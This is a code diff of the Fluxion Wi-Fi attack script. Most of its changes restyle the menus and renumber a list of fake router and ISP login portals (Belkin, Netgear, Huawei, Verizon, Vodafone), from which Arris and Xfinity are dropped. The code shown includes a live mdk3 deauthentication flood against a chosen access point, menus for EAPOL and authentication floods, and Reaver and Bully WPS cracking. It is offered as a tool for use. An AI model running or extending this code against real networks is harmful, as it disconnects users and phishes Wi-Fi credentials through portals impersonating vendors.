@@ -29,7 +29,7 @@ ipNmap=`ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*)
 # Deauth duration during handshake capture
 # oo
 DEAUTHTIME="9999999999999"
-revision=81
+revision=82
 version=0.23
 IP=192.168.1.1
 RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
@@ -61,7 +61,7 @@ general_exitmode_5="Restoring "$grey"tput"
 general_exitmode_6="Restarting "$grey"Network-Manager"
 general_exitmode_7="Cleanup performed successfully!"
 general_exitmode_8="Thanks for using fluxion"
-##############################################################################################
+[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]#####################################
 
 # DEBUG MODE = 0 ; DEBUG MODE = 1 [Normal Mode / Developer Mode]
 if [ $FLUX_DEBUG = 1 ]; then
@@ -416,12 +416,12 @@ DIALOG_WEB_DIR_BG="ltr"
 function top(){
 
 	conditional_clear
-	echo -e "$blue#########################################################"
-	echo -e "$blue#                                                       #"
-  echo -e "$blue#  $red    FLUXION $version" "${yellow} ${red}  < F""${yellow}luxion" "${red}I""${yellow}s" "${red}T""${yellow}he ""${red}F""${yellow}uture >     "          ${blue}"  #"
-	echo -e "$blue#"${yellow} by "${red}D""${yellow}eltax", "${red}"S""${yellow}"trasharo and "${red}A""${yellow}patheticEuphoria"           "    ${blue}#""
-	echo -e "$blue#                                                       #"
-	echo -e "$blue#########################################################""$transparent"
+	echo -e "$red[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]"
+	echo -e "$red[                                                      ]"
+  echo -e "$red[  $red    FLUXION $version" "${yellow} ${red}  < F""${yellow}luxion" "${red}I""${yellow}s" "${red}T""${yellow}he ""${red}F""${yellow}uture >     "          ${blue}" ]"
+	echo -e "$blue["${yellow} by "${red}D""${yellow}eltax", "${red}"S""${yellow}"trasharo and "${red}A""${yellow}patheticEuphoria"          "   ${blue}]""
+	echo -e "$blue[                                                      ]"
+	echo -e "$blue[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]""$transparent"
 	echo
 	echo
 
@@ -848,17 +848,17 @@ function language {
 
 		echo "Select your language"
 		echo "                                       "
-		echo -e "      "$blue"1)"$transparent" English          "
-		echo -e "      "$blue"2)"$transparent" German      "
-		echo -e "      "$blue"3)"$transparent" Romanian     "
-		echo -e "      "$blue"4)"$transparent" Turkish    "
-		echo -e "      "$blue"5)"$transparent" Spanish    "
-		echo -e "      "$blue"6)"$transparent" Chinese   "
-		echo -e "      "$blue"7)"$transparent" Italian   "
-		echo -e "      "$blue"8)"$transparent" Czech   "
-		echo -e "      "$blue"9)"$transparent" Greek   "
+		echo -e "      "$red"["$yellow"1"$red"]"$transparent" English          "
+		echo -e "      "$red"["$yellow"2"$red"]"$transparent" German      "
+		echo -e "      "$red"["$yellow"3"$red"]"$transparent" Romanian     "
+		echo -e "      "$red"["$yellow"4"$red"]"$transparent" Turkish    "
+		echo -e "      "$red"["$yellow"5"$red"]"$transparent" Spanish    "
+		echo -e "      "$red"["$yellow"6"$red"]"$transparent" Chinese   "
+		echo -e "      "$red"["$yellow"7"$red"]"$transparent" Italian   "
+		echo -e "      "$red"["$yellow"8"$red"]"$transparent" Czech   "
+		echo -e "      "$red"["$yellow"9"$red"]"$transparent" Greek   "
 		echo "                                       "
-		echo -n "      #> "
+		echo -n -e ""$red"["$blue"root"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
 		read yn
 		echo ""
 		case $yn in
@@ -1395,10 +1395,10 @@ function setinterface {
 		for line in "${wirelessifaces[@]}"; do
 			i=$(($i+1))
 			wirelessifaces[$i]=$line
-			echo -e "$blue ""$i)"$transparent" $line"
+			echo -e "      "$red"["$yellow"$i"$red"]"$transparent" $line"
 		done
 		echo
-		echo -n "#? "
+		echo -n -e ""$red"["$blue"root"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
 		read line
 		PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')
 
@@ -1468,15 +1468,17 @@ function choosescan {
 
 		echo "$header_choosescan"
 		echo "                                       "
-		echo -e "      "$blue"1)"$transparent" $choosescan_option_1          "
-		echo -e "      "$blue"2)"$transparent" $choosescan_option_2       "
+		echo -e "      "$red"["$yellow"1"$red"]"$transparent" $choosescan_option_1          "
+		echo -e "      "$red"["$yellow"2"$red"]"$transparent" $choosescan_option_2       "
+		echo -e "      "$red"["$yellow"3"$red"]"$red" $general_back       " $transparent
 		echo "                                       "
-		echo -n "      #> "
+		echo -n -e ""$red"["$blue"root"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
 		read yn
 		echo ""
 		case $yn in
 			1 ) Scan ; break ;;
 			2 ) Scanchan ; break ;;
+			3 ) setinterface; break;;
 			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
 		  esac
 	done
@@ -1495,7 +1497,7 @@ function Scanchan {
 	  echo -e "     $scanchan_option_2 "$blue"1-5"$transparent"             "
 	  echo -e "     $scanchan_option_2 "$blue"1,2,5-7,11"$transparent"      "
 	  echo "                                       "
-	echo -n "      #> "
+	echo -n -e ""$red"["$blue"root"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
 	read channel_number
 	set -- ${channel_number}
 	conditional_clear
@@ -1550,7 +1552,7 @@ function selection {
 
 			else
 
-			echo -e " ""$green "$i")"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$blue" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""
+			echo -e " "$red"["$yellow"$i"$red"]"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$blue" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""
 
 			fi
 
@@ -1566,7 +1568,7 @@ function selection {
 	echo -e ""$green "("$white"*"$green")$selection_1"$transparent""
 	echo ""
 	echo -e "        $selection_2"
-	echo -n "      #> "
+	echo -n -e ""$red"["$blue"root"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
 	read choice
 
 	if [[ $choice -eq "r" ]]; then
@@ -1627,7 +1629,7 @@ function wpsselection {
 				CLIENTE="*"
 			fi
 
-			echo -e " ""$green "$i")"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$red" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""
+			echo -e " "$red"["$yellow"$i"$red"]"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$red" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""
 			aidlenght=$IDLENGTH
 			assid[$i]=$ESSID
 			achannel[$i]=$CHANNEL
@@ -1640,7 +1642,7 @@ function wpsselection {
 	echo -e ""$green "("$white"*"$green ")$selection_1"$transparent""
 	echo ""
 	echo "        Select Target              "
-	echo -n "      #> "
+	echo -n -e ""$red"["$blue"root"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
 	read choice
 	idlenght=${aidlenght[$choice]}
 	ssid=${assid[$choice]}
@@ -1683,13 +1685,13 @@ function askAP {
 
 		echo "          #### $header_askAP ####"
 		echo "                                       "
-		echo -e "      "$blue"1)"$transparent" $askAP_option_1"
-		echo -e "      "$blue"2)"$transparent" $askAP_option_2"
-		echo -e "      "$blue"3)"$transparent" $askAP_option_3"
-		echo -e "      "$blue"4)"$transparent" $askAP_option_4"
-		echo -e "      "$blue"5)"$red" $general_back" $transparent""
+		echo -e "      "$red"["$yellow"1"$red"]"$transparent" $askAP_option_1"
+		echo -e "      "$red"["$yellow"2"$red"]"$transparent" $askAP_option_2"
+		echo -e "      "$red"["$yellow"3"$red"]"$transparent" $askAP_option_3"
+		echo -e "      "$red"["$yellow"4"$red"]"$transparent" $askAP_option_4"
+		echo -e "      "$red"["$yellow"5"$red"]"$red" $general_back" $transparent""
 		echo "                                       "
-		echo -n "      #> "
+		echo -n -e ""$red"["$blue"root"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
 		read yn
 		echo ""
 		case $yn in
@@ -1714,11 +1716,11 @@ function askauth {
 
 		echo "$header_askauth"
 		echo "                                       "
-		echo -e "      "$blue"1)"$transparent" $askauth_option_1"
-		echo -e "      "$blue"2)"$transparent" $askauth_option_2"
-		echo -e "      "$blue"3)"$transparent" $general_back"
+		echo -e "      "$red"["$yellow"1"$red"]"$transparent" $askauth_option_1"
+		echo -e "      "$red"["$yellow"2"$red"]"$transparent" $askauth_option_2"
+		echo -e "      "$red"["$yellow"3"$red"]"$transparent" $general_back"
 		echo "                                       "
-		echo -n "      #> "
+		echo -n -e ""$red"["$blue"root"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
 		read yn
 		echo ""
 		case $yn in
@@ -2041,16 +2043,16 @@ top
 echo "Which Attack Would You Like To Use?"
 		echo "                                       "
 		echo -e "      "$blue"0)"$transparent" Select New Target Network"
-		echo -e "      "$blue"1)"$transparent" EAPOL Start Flood"
-		echo -e "      "$blue"2)"$transparent" Authentication Flood"
-		echo -e "      "$blue"3)"$transparent" Reaver "
-		echo -e "      "$blue"4)"$transparent" Check if Access Point WPS is UNLOCKED"
-		echo -e "      "$blue"5)"$transparent" Reaver with AutoFlood(ASOC)"
-		echo -e "      "$blue"6)"$transparent" Reaver with AutoFlood(EAPOL)"
-		echo -e "      "$blue"7)"$transparent" Bully "
-		echo -e "      "$blue"8)"$transparent" Bully with AutoFlood(ASOC) "
-		echo -e "      "$blue"9)"$transparent" Bully with AutoFlood(EAPOL) "
-		echo -e "      "$blue"10)"$transparent"Exit"
+		echo -e "      "$red"["$yellow"1"$red"]"$transparent" EAPOL Start Flood"
+		echo -e "      "$red"["$yellow"2"$red"]"$transparent" Authentication Flood"
+		echo -e "      "$red"["$yellow"3"$red"]"$transparent" Reaver "
+		echo -e "      "$red"["$yellow"4"$red"]"$transparent" Check if Access Point WPS is UNLOCKED"
+		echo -e "      "$red"["$yellow"5"$red"]"$transparent" Reaver with AutoFlood(ASOC)"
+		echo -e "      "$red"["$yellow"6"$red"]"$transparent" Reaver with AutoFlood(EAPOL)"
+		echo -e "      "$red"["$yellow"7"$red"]"$transparent" Bully "
+		echo -e "      "$red"["$yellow"8"$red"]"$transparent" Bully with AutoFlood(ASOC) "
+		echo -e "      "$red"["$yellow"9"$red"]"$transparent" Bully with AutoFlood(EAPOL) "
+		echo -e "      "$red"["$yellow"10"$red"]"$transparent"Exit"
 		echo "                                       "
 		echo "*AutoFlood Attacks will store the Password in Root/(Reaver or Bully)Output.txt Once found*"
 
@@ -2085,8 +2087,8 @@ clear
 top
 echo "Would you like to Change the Wlan WIFI_MONITOR's MAC Address?"
 		echo "                                       "
-		echo -e "      "$blue"1)"$transparent" Yes"
-		echo -e "      "$blue"2)"$transparent" No"
+		echo -e "      "$red"["$yellow"1"$red"]"$transparent" Yes"
+		echo -e "      "$red"["$yellow"2"$red"]"$transparent" No"
 
 
 read c
@@ -2230,8 +2232,8 @@ clear
 
 echo "Would you like to set the 2 WIFI_MONITORs to an Identical MAC Address?"
 echo "                                       "
-echo -e "      "$blue"1)"$transparent" Yes"
-echo -e "      "$blue"2)"$transparent" No"
+echo -e "      "$red"["$yellow"1"$red"]"$transparent" Yes"
+echo -e "      "$red"["$yellow"2"$red"]"$transparent" No"
 
 
 
@@ -2386,8 +2388,8 @@ clear
 top
 echo "Would you like to set the 3 WIFI_MONITORs to an Identical MAC Address?"
 echo "                                       "
-echo -e "      "$blue"1)"$transparent" Yes"
-echo -e "      "$blue"2)"$transparent" No"
+echo -e "      "$red"["$yellow"1"$red"]"$transparent" Yes"
+echo -e "      "$red"["$yellow"2"$red"]"$transparent" No"
 
 
 read i
@@ -2898,13 +2900,13 @@ clear
 top
 echo "What is the Char. Set you wish to use? "
 echo
-echo -e "      "$blue"1)"$transparent" Numeric: [0-9]"
-echo -e "      "$blue"2)"$transparent" Alpha: [a-z]"
-echo -e "      "$blue"3)"$transparent" Upper Alpha: [A-Z]"
-echo -e "      "$blue"4)"$transparent" Alpha Numeric: [0-9][a-z]"
-echo -e "      "$blue"5)"$transparent" Upper Alpha Numeric: [0-9][A-Z]"
-echo -e "      "$blue"6)"$transparent" Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]"
-echo -e "      "$blue"7)"$transparent" USER DEFINED: Enter the characters you wish to use."
+echo -e "      "$red"["$yellow"1"$red"]"$transparent" Numeric: [0-9]"
+echo -e "      "$red"["$yellow"2"$red"]"$transparent" Alpha: [a-z]"
+echo -e "      "$red"["$yellow"3"$red"]"$transparent" Upper Alpha: [A-Z]"
+echo -e "      "$red"["$yellow"4"$red"]"$transparent" Alpha Numeric: [0-9][a-z]"
+echo -e "      "$red"["$yellow"5"$red"]"$transparent" Upper Alpha Numeric: [0-9][A-Z]"
+echo -e "      "$red"["$yellow"6"$red"]"$transparent" Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]"
+echo -e "      "$red"["$yellow"7"$red"]"$transparent" USER DEFINED: Enter the characters you wish to use."
 echo
 echo -n "#> "
 
@@ -2988,13 +2990,13 @@ clear
 top
 echo "What is the Char. Set you wish to use? "
 echo
-echo -e "      "$blue"1)"$transparent" Numeric: [0-9]"
-echo -e "      "$blue"2)"$transparent" Alpha: [a-z]"
-echo -e "      "$blue"3)"$transparent" Upper Alpha: [A-Z]"
-echo -e "      "$blue"4)"$transparent" Alpha Numeric: [0-9][a-z]"
-echo -e "      "$blue"5)"$transparent" Upper Alpha Numeric: [0-9][A-Z]"
-echo -e "      "$blue"6)"$transparent" Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]"
-echo -e "      "$blue"7)"$transparent" USER DEFINED: Enter the characters you wish to use."
+echo -e "      "$red"["$yellow"1"$red"]"$transparent" Numeric: [0-9]"
+echo -e "      "$red"["$yellow"2"$red"]"$transparent" Alpha: [a-z]"
+echo -e "      "$red"["$yellow"3"$red"]"$transparent" Upper Alpha: [A-Z]"
+echo -e "      "$red"["$yellow"4"$red"]"$transparent" Alpha Numeric: [0-9][a-z]"
+echo -e "      "$red"["$yellow"5"$red"]"$transparent" Upper Alpha Numeric: [0-9][A-Z]"
+echo -e "      "$red"["$yellow"6"$red"]"$transparent" Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]"
+echo -e "      "$red"["$yellow"7"$red"]"$transparent" USER DEFINED: Enter the characters you wish to use."
 echo
 echo -n "#> "
 
@@ -3248,13 +3250,13 @@ clear
 top
 echo "What is the Char. Set you wish to use? "
 echo
-echo -e "      "$blue"1)"$transparent" Numeric: [0-9]"
-echo -e "      "$blue"2)"$transparent" Alpha: [a-z]"
-echo -e "      "$blue"3)"$transparent" Upper Alpha: [A-Z]"
-echo -e "      "$blue"4)"$transparent" Alpha Numeric: [0-9][a-z]"
-echo -e "      "$blue"5)"$transparent" Upper Alpha Numeric: [0-9][A-Z]"
-echo -e "      "$blue"6)"$transparent" Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]"
-echo -e "      "$blue"7)"$transparent" USER DEFINED: Enter the characters you wish to use."
+echo -e "      "$red"["$yellow"1"$red"]"$transparent" Numeric: [0-9]"
+echo -e "      "$red"["$yellow"2"$red"]"$transparent" Alpha: [a-z]"
+echo -e "      "$red"["$yellow"3"$red"]"$transparent" Upper Alpha: [A-Z]"
+echo -e "      "$red"["$yellow"4"$red"]"$transparent" Alpha Numeric: [0-9][a-z]"
+echo -e "      "$red"["$yellow"5"$red"]"$transparent" Upper Alpha Numeric: [0-9][A-Z]"
+echo -e "      "$red"["$yellow"6"$red"]"$transparent" Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]"
+echo -e "      "$red"["$yellow"7"$red"]"$transparent" USER DEFINED: Enter the characters you wish to use."
 echo
 echo -n "#> "
 
@@ -3316,13 +3318,13 @@ clear
 top
 echo "What is the Char. Set you wish to use? "
 echo
-echo -e "      "$blue"1)"$transparent" Numeric: [0-9]"
-echo -e "      "$blue"2)"$transparent" Alpha: [a-z]"
-echo -e "      "$blue"3)"$transparent" Upper Alpha: [A-Z]"
-echo -e "      "$blue"4)"$transparent" Alpha Numeric: [0-9][a-z]"
-echo -e "      "$blue"5)"$transparent" Upper Alpha Numeric: [0-9][A-Z]"
-echo -e "      "$blue"6)"$transparent" Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]"
-echo -e "      "$blue"7)"$transparent" USER DEFINED: Enter the characters you wish to use."
+echo -e "      "$red"["$yellow"1"$red"]"$transparent" Numeric: [0-9]"
+echo -e "      "$red"["$yellow"2"$red"]"$transparent" Alpha: [a-z]"
+echo -e "      "$red"["$yellow"3"$red"]"$transparent" Upper Alpha: [A-Z]"
+echo -e "      "$red"["$yellow"4"$red"]"$transparent" Alpha Numeric: [0-9][a-z]"
+echo -e "      "$red"["$yellow"5"$red"]"$transparent" Upper Alpha Numeric: [0-9][A-Z]"
+echo -e "      "$red"["$yellow"6"$red"]"$transparent" Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]"
+echo -e "      "$red"["$yellow"7"$red"]"$transparent" USER DEFINED: Enter the characters you wish to use."
 echo
 echo -n "#> "
 
@@ -3590,11 +3592,11 @@ function deauthforce {
 
 		echo "$header_deauthforce"
 		echo "                                       "
-		echo -e "      "$blue"1)"$transparent" $deauthforce_option_1"
-		echo -e "      "$blue"2)"$transparent" pyrit"
-		echo -e "      "$blue"3)"$transparent" $general_back"
+		echo -e "      "$red"["$yellow"1"$red"]"$transparent" $deauthforce_option_1"
+		echo -e "      "$red"["$yellow"2"$red"]"$transparent" pyrit"
+		echo -e "      "$red"["$yellow"3"$red"]"$transparent" $general_back"
 		echo "                                       "
-		echo -n "      #> "
+		echo -n -e ""$red"["$blue"root"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
 		read yn
 		echo ""
 		case $yn in
@@ -3626,13 +3628,13 @@ function askclientsel {
 
 		echo "$header_deauthMENU"
 		echo "                                       "
-		echo -e "      "$blue"1)"$transparent" Deauth all"
-		echo -e "      "$blue"2)"$transparent" Deauth all [mdk3]"
-		echo -e "      "$blue"3)"$transparent" Deauth target "
-		echo -e "      "$blue"4)"$transparent" Rescan networks "
-		echo -e "      "$blue"5)"$transparent" Exit"
+		echo -e "      "$red"["$yellow"1"$red"]"$transparent" Deauth all"
+		echo -e "      "$red"["$yellow"2"$red"]"$transparent" Deauth all [mdk3]"
+		echo -e "      "$red"["$yellow"3"$red"]"$transparent" Deauth target "
+		echo -e "      "$red"["$yellow"4"$red"]"$transparent" Rescan networks "
+		echo -e "      "$red"["$yellow"5"$red"]"$transparent" Exit"
 		echo "                                       "
-		echo -n "      #> "
+		echo -n -e ""$red"["$blue"root"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
 		read yn
 		echo ""
 		case $yn in
@@ -3706,10 +3708,10 @@ function deauthMENU {
 		echo
 		echo -e "Status handshake: $Handshake_statuscheck"
 		echo
-		echo -e "      "$blue"1)"$transparent" $deauthMENU_option_1"
-		echo -e "      "$blue"2)"$transparent" $general_back (Select another deauth method)"
-		echo -e "      "$blue"3)"$transparent" Select another network"
-		echo -e "      "$blue"4)"$transparent" Exit"
+		echo -e "      "$red"["$yellow"1"$red"]"$transparent" $deauthMENU_option_1"
+		echo -e "      "$red"["$yellow"2"$red"]"$transparent" $general_back (Select another deauth method)"
+		echo -e "      "$red"["$yellow"3"$red"]"$transparent" Select another network"
+		echo -e "      "$red"["$yellow"4"$red"]"$transparent" Exit"
 		echo -n '      #> '
 		read yn
 
@@ -3792,9 +3794,9 @@ function certssl {
 		echo "                                       "
 		echo "  Certificate invalid or not present, please choice"
 		echo "                                       "
-		echo -e "      "$blue"1)"$transparent" Create  a SSL certificate"
-		echo -e "      "$blue"2)"$transparent" Search for SSl certificate" # hop to certssl check again
-		echo -e "      "$blue"3)"$red" Exit" $transparent
+		echo -e "      "$red"["$yellow"1"$red"]"$transparent" Create  a SSL certificate"
+		echo -e "      "$red"["$yellow"2"$red"]"$transparent" Search for SSl certificate" # hop to certssl check again
+		echo -e "      "$red"["$yellow"3"$red"]"$red" Exit" $transparent
 		echo " "
 		echo -n '      #> '
 		read yn
@@ -3813,9 +3815,9 @@ function certssl {
 		echo "                                    	                            "
 		echo "  Certificate invalid or not present, please choice"
 		echo "                                       "
-		echo -e "      "$blue"1)"$transparent" Create  a SSL certificate"
-		echo -e "      "$blue"2)"$transparent" Search for SSl certificate" # hop to certssl check again
-		echo -e "      "$blue"3)"$red" Exit" $transparent
+		echo -e "      "$red"["$yellow"1"$red"]"$transparent" Create  a SSL certificate"
+		echo -e "      "$red"["$yellow"2"$red"]"$transparent" Search for SSl certificate" # hop to certssl check again
+		echo -e "      "$red"["$yellow"3"$red"]"$red" Exit" $transparent
 		echo " "
 		echo -n '      #> '
 		read yn
@@ -3857,9 +3859,9 @@ function webinterface {
 		echo "$header_webinterface"
 		echo
 
-		echo -e "$blue""      1)"$transparent" Web Interface"
-		echo -e "$blue""      2)"$transparent" Bruteforce"
-		echo -e "$blue""      3)"$transparent" \e[1;31mExit"$transparent""
+		echo -e "      "$red"["$yellow"1"$red"]"$transparent" Web Interface"
+		echo -e "      "$red"["$yellow"2"$red"]"$transparent" Bruteforce"
+		echo -e "      "$red"["$yellow"3"$red"]"$transparent" \e[1;31mExit"$transparent""
 
 		echo
 		echo -n "#? "
@@ -3882,32 +3884,30 @@ function ConnectionRESET {
 			echo "$header_ConnectionRESET"
 			echo
 
-			echo -e "$blue""1)"$transparent"  English     [ENG]  (NEUTRA)"
-			echo -e "$blue""2)"$transparent"  German      [GER]  (NEUTRA)"
-			echo -e "$blue""3)"$transparent"  Russian     [RUS]  (NEUTRA)"
-			echo -e "$blue""4)"$transparent"  Italian     [IT]   (NEUTRA)"
-			echo -e "$blue""5)"$transparent"  Spanish     [ESP]  (NEUTRA)"
-			echo -e "$blue""6)"$transparent"  Portuguese  [POR]  (NEUTRA)"
-			echo -e "$blue""7)"$transparent"  Chinese     [CN]   (NEUTRA)"
-			echo -e "$blue""8)"$transparent"  French      [FR]   (NEUTRA)"
-			echo -e "$blue""9)"$transparent"  Turkish     [TR]   (NEUTRA)"
-			echo -e "$blue""10)"$transparent" Romanian    [RO]   (NEUTRA)"
-			echo -e "$blue""11)"$transparent" Hungarian   [HU]   (NEUTRA)"
-			echo -e "$blue""12)"$transparent" Arabic      [ARA]  (NEUTRA)"
-			echo -e "$blue""13)"$transparent" Greek       [GR]   (NEUTRA)"
-			echo -e "$blue""14)"$transparent" Czech       [CZ]   (NEUTRA)"
-			echo -e "$blue""15)"$transparent" Norwegian   [NO]   (NEUTRA)"
-			echo -e "$blue""16)"$transparent" Bulgarian   [BG]   (NEUTRA)"
-			echo -e "$blue""17)"$transparent" Arris       [ENG]"
-			echo -e "$blue""18)"$transparent" Belkin      [ENG]"
-			echo -e "$blue""19)"$transparent" Xfinity     [ENG]"
-			echo -e "$blue""20)"$transparent" Netgear     [ENG]"
-			echo -e "$blue""21)"$transparent" Huawei      [ENG]"
-			echo -e "$blue""22)"$transparent" Verizon     [ENG]"
-			echo -e "$blue""23)"$transparent" Netgear     [ESP]"
-			echo -e "$blue""24)"$transparent" Arris       [ESP]"
-			echo -e "$blue""25)"$transparent" Vodafone    [ESP]"
-			echo -e "$blue""26)"$transparent"\e[1;31m $general_back"$transparent""
+			echo -e "      "$red"["$yellow"1"$red"]"$transparent"  English     [ENG]  (NEUTRA)"
+			echo -e "      "$red"["$yellow"2"$red"]"$transparent"  German      [GER]  (NEUTRA)"
+			echo -e "      "$red"["$yellow"3"$red"]"$transparent"  Russian     [RUS]  (NEUTRA)"
+			echo -e "      "$red"["$yellow"4"$red"]"$transparent"  Italian     [IT]   (NEUTRA)"
+			echo -e "      "$red"["$yellow"5"$red"]"$transparent"  Spanish     [ESP]  (NEUTRA)"
+			echo -e "      "$red"["$yellow"6"$red"]"$transparent"  Portuguese  [POR]  (NEUTRA)"
+			echo -e "      "$red"["$yellow"7"$red"]"$transparent"  Chinese     [CN]   (NEUTRA)"
+			echo -e "      "$red"["$yellow"8"$red"]"$transparent"  French      [FR]   (NEUTRA)"
+			echo -e "      "$red"["$yellow"9"$red"]"$transparent"  Turkish     [TR]   (NEUTRA)"
+			echo -e "      "$red"["$yellow"10"$red"]"$transparent" Romanian    [RO]   (NEUTRA)"
+			echo -e "      "$red"["$yellow"11"$red"]"$transparent" Hungarian   [HU]   (NEUTRA)"
+			echo -e "      "$red"["$yellow"12"$red"]"$transparent" Arabic      [ARA]  (NEUTRA)"
+			echo -e "      "$red"["$yellow"13"$red"]"$transparent" Greek       [GR]   (NEUTRA)"
+			echo -e "      "$red"["$yellow"14"$red"]"$transparent" Czech       [CZ]   (NEUTRA)"
+			echo -e "      "$red"["$yellow"15"$red"]"$transparent" Norwegian   [NO]   (NEUTRA)"
+			echo -e "      "$red"["$yellow"16"$red"]"$transparent" Bulgarian   [BG]   (NEUTRA)"
+			echo -e "      "$red"["$yellow"17"$red"]"$transparent" Belkin      [ENG]"
+			echo -e "      "$red"["$yellow"18"$red"]"$transparent" Netgear     [ENG]"
+			echo -e "      "$red"["$yellow"19"$red"]"$transparent" Huawei      [ENG]"
+			echo -e "      "$red"["$yellow"20"$red"]"$transparent" Verizon     [ENG]"
+			echo -e "      "$red"["$yellow"21"$red"]"$transparent" Netgear     [ESP]"
+			echo -e "      "$red"["$yellow"22"$red"]"$transparent" Arris       [ESP]"
+			echo -e "      "$red"["$yellow"23"$red"]"$transparent" Vodafone    [ESP]"
+			echo -e "      "$red"["$yellow"24"$red"]"$transparent"\e[1;31m $general_back"$transparent""
 			echo
 			echo -n "#? "
 			read fluxass
@@ -4136,43 +4136,37 @@ function ConnectionRESET {
                                 NEUTRA
                                 break
 
+			
 			elif [ "$fluxass" = "17" ]; then
-                		ARRIS
-				break
-
-			elif [ "$fluxass" = "18" ]; then
 				BELKIN
 				break
 
-			elif [ "$fluxass" = "19" ]; then
-				XFINITY
-				break
-
-			elif [ "$fluxass" = "20" ]; then
+		
+			elif [ "$fluxass" = "18" ]; then
 				NETGEAR
 				break
 
-    			elif [ "$fluxass" = "21" ]; then
+    			elif [ "$fluxass" = "19" ]; then
 				HUAWEI
 				break
 
-			elif [ "$fluxass" = "22" ]; then
+			elif [ "$fluxass" = "20" ]; then
 				VERIZON
 				break
 
-			elif [ "$fluxass" = "23" ]; then
+			elif [ "$fluxass" = "21" ]; then
 				NETGEAR2
 				break
 
-			elif [ "$fluxass" = "24" ]; then
+			elif [ "$fluxass" = "22" ]; then
 				ARRIS2
 				break
 
-			elif [ "$fluxass" = "25" ]; then
+			elif [ "$fluxass" = "23" ]; then
 				VODAFONE
 				break
 
-      			elif [ "$fluxass" = "26" ]; then
+      			elif [ "$fluxass" = "24" ]; then
 				conditional_clear
 				webinterface
 				break
@@ -4425,7 +4419,7 @@ function attack {
 
 	killall aireplay-ng &> $flux_output_device
 	killall mdk3 &> $flux_output_device
-	echo "$(strings $DUMP_PATH/dump-02.csv | grep -h "$Host_SSID" | awk -F ',' '{print $1}')" >$DUMP_PATH/mdk3.txt
+	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
 	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 
 	xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
